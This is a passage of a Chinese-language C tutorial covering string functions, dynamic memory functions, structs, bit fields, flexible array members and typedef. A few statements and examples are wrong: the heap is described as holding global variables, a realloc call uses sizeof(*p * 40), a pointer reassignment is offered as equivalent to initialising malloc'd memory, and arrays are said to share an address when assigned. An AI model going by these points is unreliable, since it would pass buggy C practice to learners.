注意，strcmp()只用来比较字符串，不用来比较字符。因为字符就是小整数，直接用相等运算符（==）就能比较。所以，不要把字符类型（char）的值，放入strcmp()当作参数。 strncmp()由于strcmp()比较的是整个字符串，C 语言又提供了strncmp()函数，只比较到指定的位置。 该函数增加了第三个参数，指定了比较的字符数。它的原型定义在string.h头文件里面。 12345int strncmp( const char* s1, const char* s2, size_t n); 它的返回值与strcmp()一样。如果两个字符串相同，返回值为0；如果s1小于s2，strcmp()返回值小于0；如果s1大于s2，返回值大于0。 下面是一个例子。 123456char s1[12] = &quot;hello world&quot;;char s2[12] = &quot;hello C&quot;;if (strncmp(s1, s2, 5) == 0) { printf(&quot;They all have hello.\\n&quot;);} 上面示例只比较两个字符串的前5个字符。 sprintf()，snprintf()sprintf()函数跟printf()类似，但是用于将数据写入字符串，而不是输出到显示器。该函数的原型定义在stdio.h头文件里面。 1int sprintf(char* s, const char* format, ...); sprintf()的第一个参数是字符串指针变量，其余参数和printf()相同，即第二个参数是格式字符串，后面的参数是待写入的变量列表。 1234567char first[6] = &quot;hello&quot;;char last[6] = &quot;world&quot;;char s[40];sprintf(s, &quot;%s %s&quot;, first, last);printf(&quot;%s\\n&quot;, s); // hello world 上面示例中，sprintf()将输出内容组合成“hello world”，然后放入了变量s。 sprintf()的返回值是写入变量的字符数量（不计入尾部的空字符\\0）。如果遇到错误，返回负值。 sprintf()有严重的安全风险，如果写入的字符串过长，超过了目标字符串的长度，sprintf()依然会将其写入，导致发生溢出。为了控制写入的字符串的长度，C 语言又提供了另一个函数snprintf()。 snprintf()只比sprintf()多了一个参数n，用来控制写入变量的字符串不超过n - 1个字符，剩下一个位置写入空字符\\0。下面是它的原型。 1int snprintf(char*s, size_t n, const char* format, ...); snprintf()总是会自动写入字符串结尾的空字符。如果你尝试写入的字符数超过指定的最大字符数，snprintf()会写入 n - 1 个字符，留出最后一个位置写入空字符。 下面是一个例子。 1snprintf(s, 12, &quot;%s %s&quot;, &quot;hello&quot;, &quot;world&quot;); 上面的例子中，snprintf()的第二个参数是12，表示写入字符串的最大长度不超过12（包括尾部的空字符）。 snprintf()的返回值是写入变量的字符数量（不计入尾部的空字符\\0），应该小于n。如果遇到错误，返回负值。 字符串数组如果一个数组的每个成员都是一个字符串，需要通过二维的字符数组实现。每个字符串本身是一个字符数组，多个字符串再组成一个数组。 123456789char weekdays[7][10] = { &quot;Monday&quot;, &quot;Tuesday&quot;, &quot;Wednesday&quot;, &quot;Thursday&quot;, &quot;Friday&quot;, &quot;Saturday&quot;, &quot;Sunday&quot;}; 上面示例就是一个字符串数组，一共包含7个字符串，所以第一维的长度是7。其中，最长的字符串的长度是10（含结尾的终止符\\0），所以第二维的长度统一设为10。 因为第一维的长度，编译器可以自动计算，所以可以省略。 123456789char weekdays[][10] = { &quot;Monday&quot;, &quot;Tuesday&quot;, &quot;Wednesday&quot;, &quot;Thursday&quot;, &quot;Friday&quot;, &quot;Saturday&quot;, &quot;Sunday&quot;}; 上面示例中，二维数组第一维的长度，可以由编译器根据后面的赋值，自动计算，所以可以不写。 数组的第二维，长度统一定为10，有点浪费空间，因为大多数成员的长度都小于10。解决方法就是把数组的第二维，从字符数组改成字符指针。 123456789char* weekdays[] = { &quot;Monday&quot;, &quot;Tuesday&quot;, &quot;Wednesday&quot;, &quot;Thursday&quot;, &quot;Friday&quot;, &quot;Saturday&quot;, &quot;Sunday&quot;}; 上面的字符串数组，其实是一个一维数组，成员就是7个字符指针，每个指针指向一个字符串（字符数组）。 遍历字符串数组的写法如下。 123for (int i = 0; i &lt; 7; i++) { printf(&quot;%s\\n&quot;, weekdays[i]);} C 语言的内存管理简介C 语言的内存管理，分成两部分。一部分是系统管理的，另一部分是用户手动管理的。 系统管理的内存，主要是函数内部的变量（局部变量）。这部分变量在函数运行时进入内存，函数运行结束后自动从内存卸载。这些变量存放的区域称为”栈“（stack），”栈“所在的内存是系统自动管理的。 用户手动管理的内存，主要是程序运行的整个过程中都存在的变量（全局变量），这些变量需要用户手动从内存释放。如果使用后忘记释放，它就一直占用内存，直到程序退出，这种情况称为”内存泄漏“（memory leak）。这些变量所在的内存称为”堆“（heap），”堆“所在的内存是用户手动管理的。 void 指针前面章节已经说过了，每一块内存都有地址，通过指针变量可以获取指定地址的内存块。指针变量必须有类型，否则编译器无法知道，如何解读内存块保存的二进制数据。但是，向系统请求内存的时候，有时不确定会有什么样的数据写入内存，需要先获得内存块，稍后再确定写入的数据类型。 为了满足这种需求，C 语言提供了一种不定类型的指针，叫做 void 指针。它只有内存块的地址信息，没有类型信息，等到使用该块内存的时候，再向编译器补充说明，里面的数据类型是什么。 另一方面，void 指针等同于无类型指针，可以指向任意类型的数据，但是不能解读数据。void 指针与其他所有类型指针之间是互相转换关系，任一类型的指针都可以转为 void 指针，而 void 指针也可以转为任一类型的指针。 1234int x = 10;void* p = &amp;x; // 整数指针转为 void 指针int* q = p; // void 指针转为整数指针 上面示例演示了，整数指针和 void 指针如何互相转换。&amp;x是一个整数指针，p是 void 指针，赋值时&amp;x的地址会自动解释为 void 类型。同样的，p再赋值给整数指针q时，p的地址会自动解释为整数指针。 注意，由于不知道 void 指针指向什么类型的值，所以不能用*运算符取出它指向的值。 1234char a = 'X';void* p = &amp;a;printf(&quot;%c\\n&quot;, *p); // 报错 上面示例中，p是一个 void 指针，所以这时无法用*p取出指针指向的值。 void 指针的重要之处在于，很多内存相关函数的返回值就是 void 指针，只给出内存块的地址信息，所以放在最前面进行介绍。 malloc()malloc()函数用于分配内存，该函数向系统要求一段内存，系统就在“堆”里面分配一段连续的内存块给它。它的原型定义在头文件stdlib.h。 1void* malloc(size_t size) 它接受一个非负整数作为参数，表示所要分配的内存字节数，返回一个 void 指针，指向分配好的内存块。这是非常合理的，因为malloc()函数不知道，将要存储在该块内存的数据是什么类型，所以只能返回一个无类型的 void 指针。 可以使用malloc()为任意类型的数据分配内存，常见的做法是先使用sizeof()函数，算出某种数据类型所需的字节长度，然后再将这个长度传给malloc()。 1234int* p = malloc(sizeof(int));*p = 12;printf(&quot;%d\\n&quot;, *p); // 12 上面示例中，先为整数类型分配一段内存，然后将整数12放入这段内存里面。这个例子其实不需要使用malloc()，因为 C 语言会自动为整数（本例是12）提供内存。 有时候为了增加代码的可读性，可以对malloc()返回的指针进行一次强制类型转换。 1int* p = (int*) malloc(sizeof(int)); 上面代码将malloc()返回的 void 指针，强制转换成了整数指针。 由于sizeof()的参数可以是变量，所以上面的例子也可以写成下面这样。 1int* p = (int*) malloc(sizeof(*p)); malloc()分配内存有可能分配失败，这时返回常量 NULL。Null 的值为0，是一个无法读写的内存地址，可以理解成一个不指向任何地方的指针。它在包括stdlib.h等多个头文件里面都有定义，所以只要可以使用malloc()，就可以使用NULL。由于存在分配失败的可能，所以最好在使用malloc()之后检查一下，是否分配成功。 12345678910int* p = malloc(sizeof(int));if (p == NULL) { // 内存分配失败}// orif (!p) { //...} 上面示例中，通过判断返回的指针p是否为NULL，确定malloc()是否分配成功。 malloc()最常用的场合，就是为数组和自定义数据结构分配内存。 1234int* p = (int*) malloc(sizeof(int) * 10);for (int i = 0; i &lt; 10; i++) p[i] = i * 5; 上面示例中，p是一个整数指针，指向一段可以放置10个整数的内存，所以可以用作数组。 malloc()用来创建数组，有一个好处，就是它可以创建动态数组，即根据成员数量的不同，而创建长度不同的数组。 1int* p = (int*) malloc(n * sizeof(int)); 上面示例中，malloc()可以根据变量n的不同，动态为数组分配不同的大小。 注意，malloc()不会对所分配的内存进行初始化，里面还保存着原来的值。如果没有初始化，就使用这段内存，可能从里面读到以前的值。程序员要自己负责初始化，比如，字符串初始化可以使用strcpy()函数。 12345char* p = malloc(4);strcpy(p, &quot;abc&quot;);// orp = &quot;abc&quot;; 上面示例中，字符指针p指向一段4个字节的内存，strcpy()将字符串“abc”拷贝放入这段内存，完成了这段内存的初始化。 free()free()用于释放malloc()函数分配的内存，将这块内存还给系统以便重新使用，否则这个内存块会一直占用到程序运行结束。该函数的原型定义在头文件stdlib.h里面。 1void free(void* block) 上面代码中，free()的参数是malloc()返回的内存地址。下面就是用法实例。 1234int* p = (int*) malloc(sizeof(int));*p = 12;free(p); 注意，分配的内存块一旦释放，就不应该再次操作已经释放的地址，也不应该再次使用free()对该地址释放第二次。 一个很常见的错误是，在函数内部分配了内存，但是函数调用结束时，没有使用free()释放内存。 1234void gobble(double arr[], int n) { double* temp = (double*) malloc(n * sizeof(double)); // ...} 上面示例中，函数gobble()内部分配了内存，但是没有写free(temp)。这会造成函数运行结束后，占用的内存块依然保留，如果多次调用gobble()，就会留下多个内存块。并且，由于指针temp已经消失了，也无法访问这些内存块，再次使用。 calloc()calloc()函数的作用与malloc()相似，也是分配内存块。该函数的原型定义在头文件stdlib.h。 两者的区别主要有两点： （1）calloc()接受两个参数，第一个参数是某种数据类型的值的数量，第二个是该数据类型的单位字节长度。 1void* calloc(size_t n, size_t size); calloc()的返回值也是一个 void 指针。分配失败时，返回 NULL。 （2）calloc()会将所分配的内存全部初始化为0。malloc()不会对内存进行初始化，如果想要初始化为0，还要额外调用memset()函数。 12345int* p = calloc(10, sizeof(int));// 等同于int* p = malloc(sizeof(int) * 10);memset(p, 0, sizeof(int) * 10); 上面示例中，calloc()相当于malloc() + memset()。 calloc()分配的内存块，也要使用free()释放。 realloc()realloc()函数用于修改已经分配的内存块的大小，可以放大也可以缩小，返回一个指向新的内存块的指针。如果分配不成功，返回 NULL。该函数的原型定义在头文件stdlib.h。 1void* realloc(void* block, size_t size) 它接受两个参数。 block：已经分配好的内存块指针（由malloc()或calloc()或realloc()产生）。 size：该内存块的新大小，单位为字节。 realloc()可能返回一个全新的地址（数据也会自动复制过去），也可能返回跟原来一样的地址。realloc()优先在原有内存块上进行缩减，尽量不移动数据，所以通常是返回原先的地址。如果新内存块小于原来的大小，则丢弃超出的部分；如果大于原来的大小，则不对新增的部分进行初始化（程序员可以自动调用memset()）。 下面是一个例子，b是数组指针，realloc()动态调整它的大小。 1234int* b;b = malloc(sizeof(int) * 10);b = realloc(b, sizeof(int) * 2000); 上面示例中，指针b原来指向10个成员的整数数组，使用realloc()调整为2000个成员的数组。这就是手动分配数组内存的好处，可以在运行时随时调整数组的长度。 realloc()的第一个参数可以是 NULL，这时就相当于新建一个指针。 123char* p = realloc(NULL, 3490);// 等同于char* p = malloc(3490); 如果realloc()的第二个参数是0，就会释放掉内存块。 由于有分配失败的可能，所以调用realloc()以后，最好检查一下它的返回值是否为 NULL。分配失败时，原有内存块中的数据不会发生改变。 123456float* new_p = realloc(p, sizeof(*p * 40));if (new_p == NULL) { printf(&quot;Error reallocing\\n&quot;); return 1;} 注意，realloc()不会对内存块进行初始化。 restrict 说明符声明指针变量时，可以使用restrict说明符，告诉编译器，该块内存区域只有当前指针一种访问方式，其他指针不能读写该块内存。这种指针称为“受限指针”（restrict pointer）。 12int* restrict p;p = malloc(sizeof(int)); 上面示例中，声明指针变量p时，加入了restrict说明符，使得p变成了受限指针。后面，当p指向malloc()函数返回的一块内存区域，就味着，该区域只有通过p来访问，不存在其他访问方式。 12345int* restrict p;p = malloc(sizeof(int));int* q = p;*q = 0; // 未定义行为 上面示例中，另一个指针q与受限指针p指向同一块内存，现在该内存有p和q两种访问方式。这就违反了对编译器的承诺，后面通过*q对该内存区域赋值，会导致未定义行为。 memcpy()memcpy()用于将一块内存拷贝到另一块内存。该函数的原型定义在头文件string.h。 12345void* memcpy( void* restrict dest, void* restrict source, size_t n); 上面代码中，dest是目标地址，source是源地址，第三个参数n是要拷贝的字节数n。如果要拷贝10个 double 类型的数组成员，n就等于10 * sizeof(double)，而不是10。该函数会将从source开始的n个字节，拷贝到dest。 dest和source都是 void 指针，表示这里不限制指针类型，各种类型的内存数据都可以拷贝。两者都有 restrict 关键字，表示这两个内存块不应该有互相重叠的区域。 memcpy()的返回值是第一个参数，即目标地址的指针。 因为memcpy()只是将一段内存的值，复制到另一段内存，所以不需要知道内存里面的数据是什么类型。下面是复制字符串的例子。 12345678910111213#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main(void) { char s[] = &quot;Goats!&quot;; char t[100]; memcpy(t, s, sizeof(s)); // 拷贝7个字节，包括终止符 printf(&quot;%s\\n&quot;, t); // &quot;Goats!&quot; return 0;} 上面示例中，字符串s所在的内存，被拷贝到字符数组t所在的内存。 memcpy()可以取代strcpy()进行字符串拷贝，而且是更好的方法，不仅更安全，速度也更快，它不检查字符串尾部的\\0字符。 123456789101112char* s = &quot;hello world&quot;;size_t len = strlen(s) + 1;char *c = malloc(len);if (c) { // strcpy() 的写法 strcpy(c, s); // memcpy() 的写法 memcpy(c, s, len);} 上面示例中，两种写法的效果完全一样，但是memcpy()的写法要好于strcpy()。 使用 void 指针，也可以自定义一个复制内存的函数。 1234567891011void* my_memcpy(void* dest, void* src, int byte_count) { char* s = src; char* d = dest; while (byte_count--) { *d++ = *s++; } return dest;} 上面示例中，不管传入的dest和src是什么类型的指针，将它们重新定义成一字节的 Char 指针，这样就可以逐字节进行复制。*d++ = *s++语句相当于先执行*d = *s（源字节的值复制给目标字节），然后各自移动到下一个字节。最后，返回复制后的dest指针，便于后续使用。 memmove()memmove()函数用于将一段内存数据复制到另一段内存。它跟memcpy()的主要区别是，它允许目标区域与源区域有重叠。如果发生重叠，源区域的内容会被更改；如果没有重叠，它与memcpy()行为相同。 该函数的原型定义在头文件string.h。 12345void* memmove( void* dest, void* source, size_t n); 上面代码中，dest是目标地址，source是源地址，n是要移动的字节数。dest和source都是 void 指针，表示可以移动任何类型的内存数据，两个内存区域可以有重叠。 memmove()返回值是第一个参数，即目标地址的指针。 1234int a[100];// ...memmove(&amp;a[0], &amp;a[1], 99 * sizeof(int)); 上面示例中，从数组成员a[1]开始的99个成员，都向前移动一个位置。 下面是另一个例子。 1234char x[] = &quot;Home Sweet Home&quot;;// 输出 Sweet Home Homeprintf(&quot;%s\\n&quot;, (char *) memmove(x, &amp;x[5], 10)); 上面示例中，从字符串x的5号位置开始的10个字节，就是“Sweet Home”，memmove()将其前移到0号位置，所以x就变成了“Sweet Home Home”。 memcmp()memcmp()函数用来比较两个内存区域。它的原型定义在string.h。 12345int memcmp( const void* s1, const void* s2, size_t n); 它接受三个参数，前两个参数是用来比较的指针，第三个参数指定比较的字节数。 它的返回值是一个整数。两块内存区域的每个字节以字符形式解读，按照字典顺序进行比较，如果两者相同，返回0；如果s1大于s2，返回大于0的整数；如果s1小于s2，返回小于0的整数。 123char* s1 = &quot;abc&quot;;char* s2 = &quot;acd&quot;;int r = memcmp(s1, s2, 3); // 小于 0 上面示例比较s1和s2的前三个字节，由于s1小于s2，所以r是一个小于0的整数，一般为-1。 下面是另一个例子。 123456char s1[] = {'b', 'i', 'g', '\\0', 'c', 'a', 'r'};char s2[] = {'b', 'i', 'g', '\\0', 'c', 'a', 't'};if (memcmp(s1, s2, 3) == 0) // trueif (memcmp(s1, s2, 4) == 0) // trueif (memcmp(s1, s2, 7) == 0) // false 上面示例展示了，memcmp()可以比较内部带有字符串终止符\\0的内存区域。 struct 结构简介C 语言内置的数据类型，除了最基本的几种原始类型，只有数组属于复合类型，可以同时包含多个值，但是只能包含相同类型的数据，实际使用中并不够用。 实际使用中，主要有下面两种情况，需要更灵活强大的复合类型。 复杂的物体需要使用多个变量描述，这些变量都是相关的，最好有某种机制将它们联系起来。 某些函数需要传入多个参数，如果一个个按照顺序传入，非常麻烦，最好能组合成一个复合结构传入。 为了解决这些问题，C 语言提供了struct关键字，允许自定义复合数据类型，将不同类型的值组合在一起。这样不仅为编程提供方便，也有利于增强代码的可读性。C 语言没有其他语言的对象（object）和类（class）的概念，struct 结构很大程度上提供了对象和类的功能。 下面是struct自定义数据类型的一个例子。 1234struct fraction { int numerator; int denominator;}; 上面示例定义了一个分数的数据类型struct fraction，包含两个属性numerator和denominator。 注意，作为一个自定义的数据类型，它的类型名要包括struct关键字，比如上例是struct fraction，单独的fraction没有任何意义，甚至脚本还可以另外定义名为fraction的变量，虽然这样很容易造成混淆。另外，struct语句结尾的分号不能省略，否则很容易产生错误。 定义了新的数据类型以后，就可以声明该类型的变量，这与声明其他类型变量的写法是一样的。 1234struct fraction f1;f1.numerator = 22;f1.denominator = 7; 上面示例中，先声明了一个struct fraction类型的变量f1，这时编译器就会为f1分配内存，接着就可以为f1的不同属性赋值。可以看到，struct 结构的属性通过点（.）来表示，比如numerator属性要写成f1.numerator。 再提醒一下，声明自定义类型的变量时，类型名前面，不要忘记加上struct关键字。也就是说，必须使用struct fraction f1声明变量，不能写成fraction f1。 除了逐一对属性赋值，也可以使用大括号，一次性对 struct 结构的所有属性赋值。 1234567struct car { char* name; float price; int speed;};struct car saturn = {&quot;Saturn SL/2&quot;, 16000.99, 175}; 上面示例中，变量saturn是struct cat类型，大括号里面同时对它的三个属性赋值。如果大括号里面的值的数量，少于属性的数量，那么缺失的属性自动初始化为0。 注意，大括号里面的值的顺序，必须与 struct 类型声明时属性的顺序一致。否则，必须为每个值指定属性名。 1struct car saturn = {.speed=172, .name=&quot;Saturn SL/2&quot;}; 上面示例中，初始化的属性少于声明时的属性，这时剩下的那些属性都会初始化为0。 声明变量以后，可以修改某个属性的值。 12struct car saturn = {.speed=172, .name=&quot;Saturn SL/2&quot;};saturn.speed = 168; 上面示例将speed属性的值改成168。 struct 的数据类型声明语句与变量的声明语句，可以合并为一个语句。 12345struct book { char title[500]; char author[100]; float value;} b1; 上面的语句同时声明了数据类型book和该类型的变量b1。如果类型标识符book只用在这一个地方，后面不再用到，这里可以将类型名省略。 12345struct { char title[500]; char author[100]; float value;} b1; 上面示例中，struct声明了一个匿名数据类型，然后又声明了这个类型的变量b1。 与其他变量声明语句一样，可以在声明变量的同时，对变量赋值。 123456struct { char title[500]; char author[100]; float value;} b1 = {&quot;Harry Potter&quot;, &quot;J. K. Rowling&quot;, 10.0}, b2 = {&quot;Cancer Ward&quot;, &quot;Aleksandr Solzhenitsyn&quot;, 7.85}; 上面示例中，在声明变量b1和b2的同时，为它们赋值。 下一章介绍的typedef命令可以为 struct 结构指定一个别名，这样使用起来更简洁。 123456typedef struct cell_phone { int cell_no; float minutes_of_charge;} phone;phone p = {5551234, 5}; 上面示例中，phone就是struct cell_phone的别名。 指针变量也可以指向struct结构。 12345678910111213struct book { char title[500]; char author[100]; float value;}* b1;// 或者写成两个语句struct book { char title[500]; char author[100]; float value;};struct book* b1; 上面示例中，变量b1是一个指针，指向的数据是struct book类型的实例。 struct 结构也可以作为数组成员。 1234struct fraction numbers[1000];numbers[0].numerator = 22;numbers[0].denominator = 7; 上面示例声明了一个有1000个成员的数组numbers，每个成员都是自定义类型fraction的实例。 struct 结构占用的存储空间，不是各个属性存储空间的总和。因为为了计算效率，C 语言的内存占用空间一般来说，都必须是int类型存储空间的倍数。如果int类型的存储是4字节，那么 struct 类型的存储空间就总是4的倍数。 12struct { char a; int b; } s;printf(&quot;%d\\n&quot;, sizeof(s)); // 8 上面示例中，如果按照属性占据的空间相加，变量s的存储空间应该是5个字节。但是，struct 结构的存储空间是int类型的倍数，所以最后的结果是占据8个字节，a属性与b属性之间有3个字节的“空洞”。 struct 的复制struct 变量可以使用赋值运算符（=），复制给另一个变量，这时会生成一个全新的副本。系统会分配一块新的内存空间，大小与原来的变量相同，把每个属性都复制过去，即原样生成了一份数据。这一点跟数组的复制不一样，务必小心。 12345678910struct cat { char name[30]; short age; } a, b;strcpy(a.name, &quot;Hula&quot;);a.age = 3;b = a;b.name[0] = 'M';printf(&quot;%s\\n&quot;, a.name); // Hulaprintf(&quot;%s\\n&quot;, b.name); // Mula 上面示例中，变量b是变量a的副本，两个变量的值是各自独立的，修改掉b.name不影响a.name。 上面这个示例是有前提的，就是 struct 结构的属性必须定义成字符数组，才能复制数据。如果稍作修改，属性定义成字符指针，结果就不一样。 123456struct cat { char* name; short age; } a, b;a.name = &quot;Hula&quot;;a.age = 3;b = a; 上面示例中，name属性变成了一个字符指针，这时a赋值给b，导致b.name也是同样的字符指针，指向同一个地址，也就是说两个属性共享同一个地址。因为这时，struct 结构内部保存的是一个指针，而不是上一个例子的数组，这时复制的就不是字符串本身，而是它的指针。并且，这个时候也没法修改字符串，因为字符指针指向的字符串是不能修改的。 总结一下，赋值运算符（=）可以将 struct 结构每个属性的值，一模一样复制一份，拷贝给另一个 struct 变量。这一点跟数组完全不同，使用赋值运算符复制数组，不会复制数据，只会共享地址。 注意，这种赋值要求两个变量是同一个类型，不同类型的 struct 变量无法互相赋值。 另外，C 语言没有提供比较两个自定义数据结构是否相等的方法，无法用比较运算符（比如==和!=）比较两个数据结构是否相等或不等。 struct 指针如果将 struct 变量传入函数，函数内部得到的是一个原始值的副本。 123456789101112131415161718#include &lt;stdio.h&gt;struct turtle { char* name; char* species; int age;};void happy(struct turtle t) { t.age = t.age + 1;}int main() { struct turtle myTurtle = {&quot;MyTurtle&quot;, &quot;sea turtle&quot;, 99}; happy(myTurtle); printf(&quot;Age is %i\\n&quot;, myTurtle.age); // 输出 99 return 0;} 上面示例中，函数happy()传入的是一个 struct 变量myTurtle，函数内部有一个自增操作。但是，执行完happy()以后，函数外部的age属性值根本没变。原因就是函数内部得到的是 struct 变量的副本，改变副本影响不到函数外部的原始数据。 通常情况下，开发者希望传入函数的是同一份数据，函数内部修改数据以后，会反映在函数外部。而且，传入的是同一份数据，也有利于提高程序性能。这时就需要将 struct 变量的指针传入函数，通过指针来修改 struct 属性，就可以影响到函数外部。 struct 指针传入函数的写法如下。 1234void happy(struct turtle* t) {}happy(&amp;myTurtle); 上面代码中，t是 struct 结构的指针，调用函数时传入的是指针。struct 类型跟数组不一样，类型标识符本身并不是指针，所以传入时，指针必须写成&amp;myTurtle。 函数内部也必须使用(*t).age的写法，从指针拿到 struct 结构本身。 123void happy(struct turtle* t) { (*t).age = (*t).age + 1;} 上面示例中，(*t).age不能写成*t.age，因为点运算符.的优先级高于*。*t.age这种写法会将t.age看成一个指针，然后取它对应的值，会出现无法预料的结果。 现在，重新编译执行上面的整个示例，happy()内部对 struct 结构的操作，就会反映到函数外部。 (*t).age这样的写法很麻烦。C 语言就引入了一个新的箭头运算符（-&gt;），可以从 struct 指针上直接获取属性，大大增强了代码的可读性。 123void happy(struct turtle* t) { t-&gt;age = t-&gt;age + 1;} 总结一下，对于 struct 变量名，使用点运算符（.）获取属性；对于 struct 变量指针，使用箭头运算符（-&gt;）获取属性。以变量myStruct为例，假设ptr是它的指针，那么下面三种写法是同一回事。 12// ptr == &amp;myStructmyStruct.prop == (*ptr).prop == ptr-&gt;prop struct 的嵌套struct 结构的成员可以是另一个 struct 结构。 12345678910struct species { char* name; int kinds;};struct fish { char* name; int age; struct species breed;}; 上面示例中，fish的属性breed是另一个 struct 结构species。 赋值的时候有多种写法。 1234567891011121314151617181920212223// 写法一struct fish shark = {&quot;shark&quot;, 9, {&quot;Selachimorpha&quot;, 500}};// 写法二struct species myBreed = {&quot;Selachimorpha&quot;, 500};struct fish shark = {&quot;shark&quot;, 9, myBreed};// 写法三struct fish shark = { .name=&quot;shark&quot;, .age=9, .breed={&quot;Selachimorpha&quot;, 500}};// 写法四struct fish shark = { .name=&quot;shark&quot;, .age=9, .breed.name=&quot;Selachimorpha&quot;, .breed.kinds=500};printf(&quot;Shark's species is %s&quot;, shark.breed.name); 上面示例展示了嵌套 Struct 结构的四种赋值写法。另外，引用breed属性的内部属性，要使用两次点运算符（shark.breed.name）。 下面是另一个嵌套 struct 的例子。 1234567891011121314151617struct name { char first[50]; char last[50];};struct student { struct name name; short age; char sex;} student1;strcpy(student1.name.first, &quot;Harry&quot;);strcpy(student1.name.last, &quot;Potter&quot;);// orstruct name myname = {&quot;Harry&quot;, &quot;Potter&quot;};student1.name = myname; 上面示例中，自定义类型student的name属性是另一个自定义类型，如果要引用后者的属性，就必须使用两个.运算符，比如student1.name.first。另外，对字符数组属性赋值，要使用strcpy()函数，不能直接赋值，因为直接改掉字符数组名的地址会报错。 struct 结构内部不仅可以引用其他结构，还可以自我引用，即结构内部引用当前结构。比如，链表结构的节点就可以写成下面这样。 1234struct node { int data; struct node* next;}; 上面示例中，node结构的next属性，就是指向另一个node实例的指针。下面，使用这个结构自定义一个数据链表。 1234567891011121314151617181920212223struct node { int data; struct node* next;};struct node* head;// 生成一个三个节点的列表 (11)-&gt;(22)-&gt;(33)head = malloc(sizeof(struct node));head-&gt;data = 11;head-&gt;next = malloc(sizeof(struct node));head-&gt;next-&gt;data = 22;head-&gt;next-&gt;next = malloc(sizeof(struct node));head-&gt;next-&gt;next-&gt;data = 33;head-&gt;next-&gt;next-&gt;next = NULL;// 遍历这个列表for (struct node *cur = head; cur != NULL; cur = cur-&gt;next) { printf(&quot;%d\\n&quot;, cur-&gt;data);} 上面示例是链表结构的最简单实现，通过for循环可以对其进行遍历。 位字段struct 还可以用来定义二进制位组成的数据结构，称为“位字段”（bit field），这对于操作底层的二进制数据非常有用。 123456789typedef struct { unsigned int ab:1; unsigned int cd:1; unsigned int ef:1; unsigned int gh:1;} synth;synth.ab = 0;synth.cd = 1; 上面示例中，每个属性后面的:1，表示指定这些属性只占用一个二进制位，所以这个数据结构一共是4个二进制位。 注意，定义二进制位时，结构内部的各个属性只能是整数类型。 实际存储的时候，C 语言会按照int类型占用的字节数，存储一个位字段结构。如果有剩余的二进制位，可以使用未命名属性，填满那些位。也可以使用宽度为0的属性，表示占满当前字节剩余的二进制位，迫使下一个属性存储在下一个字节。 1234567struct { unsigned int field1 : 1; unsigned int : 2; unsigned int field2 : 1; unsigned int : 0; unsigned int field3 : 1;} stuff; 上面示例中，stuff.field1与stuff.field2之间，有一个宽度为两个二进制位的未命名属性。stuff.field3将存储在下一个字节。 弹性数组成员很多时候，不能事先确定数组到底有多少个成员。如果声明数组的时候，事先给出一个很大的成员数，就会很浪费空间。C 语言提供了一个解决方法，叫做弹性数组成员（flexible array member）。 如果不能事先确定数组成员的数量时，可以定义一个 struct 结构。 1234struct vstring { int len; char chars[];}; 上面示例中，struct vstring结构有两个属性。len属性用来记录数组chars的长度，chars属性是一个数组，但是没有给出成员数量。 chars数组到底有多少个成员，可以在为vstring分配内存时确定。 12struct vstring* str = malloc(sizeof(struct vstring) + n * sizeof(char));str-&gt;len = n; 上面示例中，假定chars数组的成员数量是n，只有在运行时才能知道n到底是多少。然后，就为struct vstring分配它需要的内存：它本身占用的内存长度，再加上n个数组成员占用的内存长度。最后，len属性记录一下n是多少。 这样就可以让数组chars有n个成员，不用事先确定，可以跟运行时的需要保持一致。 弹性数组成员有一些专门的规则。首先，弹性成员的数组，必须是 struct 结构的最后一个属性。另外，除了弹性数组成员，struct 结构必须至少还有一个其他属性。 typedef 命令简介typedef命令用来为某个类型起别名。 1typedef type name; 上面代码中，type代表类型名，name代表别名。 123typedef unsigned char BYTE;BYTE c = 'z'; 上面示例中，typedef命令为类型unsign char起别名BYTE，然后就可以使用BYTE声明变量。 typedef 可以一次指定多个别名。 1typedef int antelope, bagel, mushroom; 上面示例中，一次性为int类型起了三个别名。 typedef 可以为指针起别名。 1234typedef int* intptr;int a = 10;intptr x = &amp;a; 上面示例中，intptr是int*的别名。不过，使用的时候要小心，这样不容易看出来，变量x是一个指针类型。 typedef 也可以用来为数组类型起别名。 123typedef int five_ints[5];five_ints x = {11, 22, 33, 44, 55}; 上面示例中，five_ints是一个数组类型，包含5个整数的 typedef 为函数起别名的写法如下。 1typedef signed char (*fp)(void); 上面示例中，类型别名fp是一个指针，代表函数signed char (*)(void)。 主要好处typedef为类型起别名的好处，主要有下面几点。 （1）更好的代码可读性。 123typedef char* STRING;STRING name; 上面示例为字符指针起别名为STRING，以后使用STRING声明变量时，就可以轻易辨别该变量是字符串。 （2）为 struct、union、enum 等命令定义的复杂数据结构创建别名，从而便于引用。 12345struct treenode { // ...};typedef struct treenode* Tree; 上面示例中，Tree为struct treenode*的别名。 typedef 也可以与 struct 定义数据类型的命令写在一起。 1234typedef struct animal { char* name; int leg_count, speed;} animal; 上面示例中，自定义数据类型时，同时使用typedef命令，为struct animal起了一个别名animal。 这种情况下，C 语言允许省略 struct 命令后面的类型名。 1234typedef struct { char *name; int leg_count, speed;} animal; 上面示例相当于为一个匿名的数据类型起了别名animal。 （3）typedef 方便以后为变量改类型。 123typedef float app_float;app_float f1, f2, f3; 上面示例中，变量f1、f2、f3的类型都是float。如果以后需要为它们改类型，只需要修改typedef语句即可。 1typedef long double app_float; 上面命令将变量f1、f2、f3的类型都改为long double。 （4）可移植性 某一个值在不同计算机上的类型，可能是不一样的。 1int i = 100000; 上面代码在32位整数的计算机没有问题，但是在16位整数的计算机就会出错。 C 语言的解决办法，就是提供了类型别名，在不同计算机上会解释成不同类型，比如int32_t。 1int32_t i = 100000; 上面示例将变量i声明成int32_t类型，保证它在不同计算机上都是32位宽度，移植代码时就不会出错。 这一类的类型别名都是用 typedef 定义的。下面是类似的例子。 123typedef long int ptrdiff_t;typedef unsigned long int size_t;typedef int wchar_t; 这些整数类型别名都放在头文件stdint.h，不同架构的计算机只需修改这个头文件即可，而无需修改代码。 因此，typedef有助于提高代码的可移植性，使其能适配不同架构的计算机。 （5）简化类型声明 C 语言有些类型声明相当复杂，比如下面这个。 1char (*(*x(void))[5])(void); typedef 可以简化复杂的类型声明，使其更容易理解。首先，最外面一层起一个类型别名。 12typedef char (*Func)(void);Func (*x(void))[5]; 这个看起来还是有点复杂，就为里面一层也定义一个别名。 123typedef char (*Func)(void);typedef Func Arr[5];Arr* x(void); 上面代码就比较容易解读了。 x是一个函数，返回一个指向 Arr 类型的指针。 Arr是一个数组，有5个成员，每个成员是Func类型。 Func是一个函数指针，指向一个无参数、返回字符值的函数。 Union 